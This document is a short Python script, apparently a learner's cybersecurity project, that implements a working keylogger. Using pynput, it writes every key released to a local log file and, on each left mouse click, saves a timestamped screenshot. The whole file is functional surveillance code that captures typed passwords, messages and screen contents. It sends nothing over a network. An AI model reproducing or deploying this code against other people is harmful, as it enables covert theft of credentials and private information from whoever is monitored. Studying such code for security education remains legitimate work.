from pynput import keyboard, mouse
from PIL import ImageGrab, Image
import time

def keyboard_press(key):
    with open("/Users/prayudgurung/Desktop/CyberSecurity/Keylogger/logs.txt", "a") as file:
        try:
            file.write(key.char)
            print("Pressed : ", key.char)
        except:
            file.write("\n[" + str(key) + "]")
            print("Pressed : ", key)
    pass

def mouse_press(x, y, button, pressed):
    if pressed:
        if button == mouse.Button.left:
            current_time = time.time()
            screenshot = ImageGrab.grab()
            screenshot = screenshot.convert("RGB")
            screenshot.thumbnail((800, 600), Image.LANCZOS)
            screenshot.save(f"/Users/prayudgurung/Desktop/Cybersecurity/Keylogger/Screenshots/{current_time}.jpg", "JPEG", quality=50, optimize=True)  
            with open("/Users/prayudgurung/Desktop/CyberSecurity/Keylogger/logs.txt", "a") as file:
                file.write(f"\n Mouse Clicked {button} at {current_time}")

keyboard_listener = keyboard.Listener(on_release=keyboard_press)
mouse_listener = mouse.Listener(on_click=mouse_press)
keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()